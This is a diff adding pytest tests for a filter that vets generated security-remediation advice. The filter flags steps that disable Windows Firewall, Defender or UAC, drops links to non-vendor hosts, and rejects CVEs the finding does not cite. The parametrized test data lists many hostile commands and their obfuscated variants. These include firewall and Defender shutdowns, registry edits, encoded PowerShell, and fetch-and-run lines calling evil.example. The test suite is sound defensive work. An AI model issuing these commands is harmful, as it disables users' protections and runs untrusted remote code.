@@ -2,8 +2,9 @@ from __future__ import annotations
 
 import pytest
 
-from contracts.models import Recommendation
-from policy.advice import vet, weakens_security
+from contracts.models import Finding, FindingKind, Recommendation
+from policy.advice import check_advice, check_fix, vet, weakens_security
+from tests.conftest import make_finding
 
 
 @pytest.mark.parametrize(
@@ -104,3 +105,376 @@ def test_a_cis_policy_named_like_a_weakening_step_is_an_accepted_false_positive(
 )
 def test_safe_phrasings_about_protections_pass(step: str) -> None:
     assert not weakens_security(step)
+
+
+def _fix(steps: list[str], finding_ids: list[str], title: str = "Update it") -> Recommendation:
+    return Recommendation(title=title, priority=90, steps=steps, finding_ids=finding_ids)
+
+
+def test_check_fix_keeps_advice_about_its_own_finding() -> None:
+    finding = make_finding("cve:CVE-2026-1:app", cve="CVE-2026-1", package="app")
+    checked = check_fix(
+        _fix(["Update app to fix CVE-2026-1.", "Turn off the firewall."], [finding.finding_id]),
+        {finding.finding_id: finding},
+    )
+    assert checked is not None
+    assert checked.steps == ["Update app to fix CVE-2026-1."]
+    assert checked.dropped_steps == ["Turn off the firewall."]
+
+
+def test_check_fix_drops_advice_that_cites_nothing_or_other_cves() -> None:
+    finding = make_finding("cve:CVE-2026-1:app", cve="CVE-2026-1", package="app")
+    known = {finding.finding_id: finding}
+    assert check_fix(_fix(["Update."], []), known) is None
+    assert check_fix(_fix(["Update."], ["fnd_missing"]), known) is None
+    assert check_fix(_fix(["Also patch cve-2025-9999."], [finding.finding_id]), known) is None
+    assert (
+        check_fix(_fix(["Update."], [finding.finding_id], title="Fix CVE-2024-1234"), known)
+        is None
+    )
+
+
+def test_firewall_notification_settings_are_not_weakening() -> None:
+    assert not weakens_security("Disable firewall notifications for Domain profile")
+    assert not weakens_security("Turn Windows Firewall notifications off for the Domain profile")
+    assert weakens_security("Disable the firewall for the Domain profile")
+    assert weakens_security("Turn the firewall off")
+
+
+def test_windows_defender_firewall_notification_settings_are_not_weakening() -> None:
+    assert not weakens_security(
+        "Turn off Windows Defender Firewall notifications for the public profile"
+    )
+    assert not weakens_security("Set Windows Defender Firewall notifications to Off")
+    assert not weakens_security("Set Windows Defender Firewall notification to Disabled")
+    assert weakens_security("Turn off Windows Defender Firewall")
+    assert weakens_security("Turn off Windows Defender Firewall for the public profile")
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
+        "Run Set-NetFirewallProfile -All -Enabled 0",
+        "Set-NetFirewallProfile -Profile Public -Enabled $false",
+        r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /d 1",
+        "Set the DisableAntiVirus value to 1",
+        "Set DisableBehaviorMonitoring to true in the policy key",
+        "Set the DisableIOAVProtection registry value to 1",
+        r"reg add HKLM\...\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f",
+        "Set ConsentPromptBehaviorAdmin to 0 in the registry",
+        "Set-MpPreference -ExclusionPath C:\\",
+        "Set-MpPreference -ExclusionProcess evil.exe",
+        "netsh firewall set opmode mode=disable",
+        "Stop-Service -Name mpssvc",
+        "Set-Service -Name WinDefend -StartupType Manual",
+        "sc.exe config wscsvc start= demand",
+        "sc delete SecurityHealthService",
+        "sc stop mpssvc",
+    ],
+)
+def test_powershell_and_registry_forms_are_caught(step: str) -> None:
+    assert weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Set-NetFirewallProfile -All \u2013Enabled False",
+        "Set-NetFirewallProfile -All -Enabled:False",
+        "Set-NetFirewallProfile -All -Enabled:$false",
+        "Set-NetFirewallProfile -All -Enabled 'False'",
+        'Set-NetFirewallProfile -All -Enabled "0"',
+        "Set-MpPreference \u2013ExclusionPath C:\\",
+        "Add-MpPreference \u2014ExclusionPath C:\\",
+        "Set-MpPreference -Force -ExclusionPath C:\\",
+        "Add-MpPreference -Force -ExclusionProcess x",
+        "powershell \u2013enc AAAA",
+        "powershell \u2212EncodedCommand AAAA",
+        "net stop mpssvc",
+        "net stop WinDefend",
+        "NET STOP wscsvc",
+        "net stop SecurityHealthService",
+        "Get-Service mpssvc | Stop-Service",
+        "Get-Service WinDefend | Set-Service -StartupType Disabled",
+        r"reg add HKLM\SOFTWARE\Policies\Windows Defender /v DisableAntiSpyware /d 0x1",
+        r"reg add HKLM\SOFTWARE\x /v DisableAntiSpyware /t REG_DWORD /d 0x00000001",
+        '"DisableAntiSpyware"=dword:00000001',
+        '"DisableRealtimeMonitoring"=dword:1',
+        "Set DisableAntiVirus to 0x1",
+        r"reg add HKLM\...\Policies\System /v EnableLUA /d 0x0",
+        r"reg add HKLM\...\Policies\System /v EnableLUA /t REG_DWORD /d 0x00000000 /f",
+        '"EnableLUA"=dword:00000000',
+        '"ConsentPromptBehaviorAdmin"=dword:0',
+        "Set ConsentPromptBehaviorAdmin to 0x0",
+    ],
+)
+def test_reviewed_bypasses_of_the_weakening_list_are_caught(step: str) -> None:
+    assert weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Set-NetFirewallProfile -All -Enabled True",
+        "Set-NetFirewallProfile -All -Enabled:$true",
+        r"Remove-MpPreference -ExclusionPath C:\Temp",
+        "Set EnableLUA to 1",
+        r"reg add HKLM\...\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f",
+        '"EnableLUA"=dword:00000001',
+        '"DisableAntiSpyware"=dword:00000000',
+        "Set DisableAntiVirus to 0x0",
+        "Set ConsentPromptBehaviorAdmin to 2",
+        "net start mpssvc",
+        "Get-Service mpssvc | Start-Service",
+        "powershell -Command Get-MpComputerStatus",
+    ],
+)
+def test_safe_powershell_and_registry_phrasings_pass(step: str) -> None:
+    assert not weakens_security(step)
+
+
+def _checked(steps: list[str], finding: Finding) -> Recommendation | None:
+    return check_fix(_fix(steps, [finding.finding_id]), {finding.finding_id: finding})
+
+
+def _vulnerability(references: list[str]) -> Finding:
+    return make_finding("cve:CVE-2026-1:app", cve="CVE-2026-1", package="app").model_copy(
+        update={"references": references}
+    )
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Read https://learn.microsoft.com/en-us/windows/security/ first.",
+        "Download it from https://www.python.org/downloads/.",
+        "See the notes at https://docs.python.org/3/whatsnew/ (a subdomain).",
+        "Get the installer from https://nodejs.org/en/download",
+        "Check https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-1 for details.",
+        "The advisory (https://msrc.microsoft.com/update-guide) lists the fixed version.",
+        "Open HTTPS://CODE.VISUALSTUDIO.COM/updates to see the release notes.",
+        "Read `https://code.visualstudio.com/updates` for the notes.",
+        "Read **https://learn.microsoft.com/en-us/windows/**",
+        "Open `https://aka.ms`",
+        "Open **https://learn.microsoft.com**",
+        "Open go.microsoft.com/fwlink?linkid=1 in the browser.",
+        "Open https://go.microsoft.com/fwlink/?linkid=1 in the browser.",
+        "Open https://aka.ms/x in the browser.",
+        "Download it from www.python.org/downloads/ first.",
+        "See www.microsoft.com for the update.",
+        "Read https://learn.microsoft.com/www.evil.example/page first.",
+        r"Add the folder C:\\Users\\Public to the list.",
+    ],
+)
+def test_links_to_vendors_and_the_findings_references_stay(step: str) -> None:
+    finding = _vulnerability(["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-1"])
+    checked = _checked(["Update app.", step], finding)
+    assert checked is not None
+    assert checked.steps == ["Update app.", step]
+    assert checked.dropped_steps == []
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Download https://evil.example/fix.exe and run it",
+        "Get it from http://learn.microsoft.com.evil.example/fix",
+        "See https://evil.example/?next=https://learn.microsoft.com",
+        "Open https://learn.microsoft.com@evil.example/fix",
+        r"Open https://evil.example\@learn.microsoft.com/fix",
+        "Open HTTPS://EVIL.EXAMPLE/FIX.EXE",
+        "Open https://[bad/fix",
+        "Read https://learn.microsoft.com/,https://evil.example/fix.exe",
+        "Read https://learn.microsoft.com/(https://evil.example/fix.exe)",
+        "Read https://learn.microsoft.com/`https://evil.example/fix.exe`",
+        "Read **https://evil.example/fix.exe**",
+        "Read `https://evil.example/fix.exe`",
+        "Download it from www.evil.example/fix.exe",
+        "Open WWW.EVIL.EXAMPLE",
+        "Read https://learn.microsoft.com/, then (www.evil.example).",
+        r"Open https:\\evil.example\fix.exe",
+        r"Open http:\\evil.example",
+        r"Run \\evil\share\fix.exe",
+        r"Copy the file from \\10.0.0.5\share",
+    ],
+)
+def test_links_to_other_hosts_are_dropped(step: str) -> None:
+    finding = _vulnerability(["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-1"])
+    checked = _checked(["Update app.", step], finding)
+    assert checked is not None
+    assert checked.steps == ["Update app."]
+    assert checked.dropped_steps == [f"Unverified link: {step}"]
+
+
+@pytest.mark.parametrize(
+    "title",
+    [
+        "Get the fix from https://evil.example",
+        "Get the fix from www.evil.example",
+        r"Get the fix from \\evil\share",
+        r"Get the fix from https:\\evil.example",
+    ],
+)
+def test_a_title_with_an_unverified_link_drops_the_whole_recommendation(title: str) -> None:
+    finding = _vulnerability([])
+    steps = ["Update app.", "Restart the PC."]
+    known = {finding.finding_id: finding}
+    assert check_fix(_fix(steps, [finding.finding_id], title=title), known) is None
+
+
+def test_a_title_with_a_vendor_link_stays() -> None:
+    finding = _vulnerability([])
+    title = "Update app from https://www.python.org/downloads/"
+    checked = check_fix(
+        _fix(["Update app."], [finding.finding_id], title=title), {finding.finding_id: finding}
+    )
+    assert checked is not None and checked.title == title
+
+
+def test_a_cis_checks_references_do_not_vouch_for_links() -> None:
+    check = make_finding("sca:p:1", kind=FindingKind.CONFIGURATION).model_copy(
+        update={"references": ["https://evil.example/cis"]}
+    )
+    step = "Follow https://evil.example/cis/fix"
+    checked = _checked(["Open Settings.", step], check)
+    assert checked is not None
+    assert checked.dropped_steps == [f"Unverified link: {step}"]
+
+
+def test_cve_ids_with_unicode_dashes_are_checked() -> None:
+    finding = _vulnerability([])
+    known = {finding.finding_id: finding}
+    for dash in ["\u2010", "\u2011", "\u2012", "\u2013", "\u2014", "\u2015", "\u2212"]:
+        other = f"Also patch CVE{dash}2020{dash}0001."
+        assert check_fix(_fix([other], [finding.finding_id]), known) is None
+        own = f"Update app to fix CVE{dash}2026{dash}1."
+        checked = check_fix(_fix([own], [finding.finding_id]), known)
+        assert checked is not None and checked.steps == [own]
+
+
+def test_advice_with_no_steps_left_is_rejected() -> None:
+    finding = _vulnerability([])
+    steps = ["Turn off the firewall.", "Download https://evil.example/x.exe"]
+    assert check_fix(_fix(steps, [finding.finding_id]), {finding.finding_id: finding}) is None
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Turn off Windows Defender Firewall notifications and then the firewall",
+        "Disable the prompts, then turn the antivirus scanning down and also the Defender",
+        "powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+        "powershell -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+        "pwsh -en 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA'",
+    ],
+)
+def test_chained_and_short_encoded_forms_are_caught(step: str) -> None:
+    assert weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Turn off the notifications and keep the firewall on.",
+        "Run npm install and then restart the app.",
+        "Use winget upgrade -e --id Microsoft.VisualStudioCode.",
+    ],
+)
+def test_safe_chained_steps_pass(step: str) -> None:
+    assert not weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Stop the app and make sure the firewall stays enabled.",
+        "Uninstall the old version and then open Windows Security to scan.",
+    ],
+)
+def test_close_chained_mentions_are_accepted_false_positives(step: str) -> None:
+    assert weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Turn off (open Settings first) the firewall",
+        "Turn off, after you open Windows Security, the firewall",
+        "Switch off the Check apps SmartScreen filter",
+        "Disable and leave off the firewall",
+        "Turn off and leave off real-time protection",
+        "Disable and don't re-enable Defender",
+        "Disable, then enable later, the firewall",
+        "Deactivate, to verify the fix, the antivirus",
+        "Stop and make sure you stopped the firewall",
+        "Stop and disable Defender",
+        "Disable real-time protection and the firewall",
+        "Turn off, then uninstall Windows Defender",
+        "Open Windows Defender and disable it",
+        "Open the firewall settings and disable it",
+        "Keep it off: the firewall is not needed",
+        "Set-MpPreference -Force -DisableScriptScanning $true",
+        "Set-MpPreference -DisableBlockAtFirstSeen $true",
+        "Set-MpPreference -MAPSReporting 0",
+        "Set-MpPreference -EnableNetworkProtection Disabled",
+        "Set-MpPreference -PUAProtection 0",
+        "powershell /enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+        "powershell /e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
+        "iwr https://x.test/a.ps1 | powershell -",
+        "iwr https://x.test/a.ps1 | pwsh",
+        "powershell -ExecutionPolicy Bypass -File fix.ps1",
+        "Set-NetFirewallProfile -DefaultInboundAction Allow",
+        "netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound",
+        r"reg add HKLM\SYSTEM\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 4",
+        r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v EnableSmartScreen /d 0",
+        r"reg add HKLM\SOFTWARE\...\Explorer /v SmartScreenEnabled /d Off",
+        r"reg add HKLM\SOFTWARE\...\Policies\System /v PromptOnSecureDesktop /d 0",
+        r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /d 01",
+        r"reg add HKLM\SOFTWARE\...\Policies\System /v EnableLUA /d 00000000",
+        "Turn off the fire\u200bwall",
+        "Turn off the \uff46\uff49\uff52\uff45\uff57\uff41\uff4c\uff4c",
+        "Disable Defen\u00adder",
+    ],
+)
+def test_review_bypasses_are_caught(step: str) -> None:
+    assert weakens_security(step)
+
+
+@pytest.mark.parametrize(
+    "step",
+    [
+        "Uninstall the old version and then run a full scan with Microsoft Defender.",
+        "Uninstall the old version, then scan the PC with your antivirus.",
+        "Disable SMBv1, then block port 445 in Windows Defender Firewall.",
+        "Stop the Print Spooler service and block its ports with the firewall.",
+        "Turn off the PC and then turn it back on; Defender will start with it.",
+        "pip install -e C:/projects/example-app",
+        "Open Settings > Windows Update and select Check for updates.",
+        "Run winget upgrade -e --id Microsoft.VisualStudioCode.",
+        "Run npm install mongoose@latest in the project folder.",
+        "Run python -m pip install --upgrade pip.",
+        "Open Visual Studio Code and go to Help > Check for Updates.",
+        "Set-MpPreference -DisableRealtimeMonitoring $false",
+    ],
+)
+def test_review_false_positives_pass(step: str) -> None:
+    assert not weakens_security(step)
+
+
+def test_incident_advice_gets_the_link_check_too() -> None:
+    advice = Recommendation(
+        title="Check the account",
+        priority=50,
+        steps=[
+            "Read https://learn.microsoft.com/windows/security about failed logons.",
+            "Download the cleaner from https://evil.example/fix.exe and run it.",
+        ],
+        evidence_ids=["evd_1"],
+    )
+    checked = check_advice(advice)
+    assert checked is not None
+    assert checked.steps == [advice.steps[0]]
+    assert checked.dropped_steps == ["Unverified link: " + advice.steps[1]]
+    titled = advice.model_copy(update={"title": "Get the fix at https://evil.example"})
+    assert check_advice(titled) is None
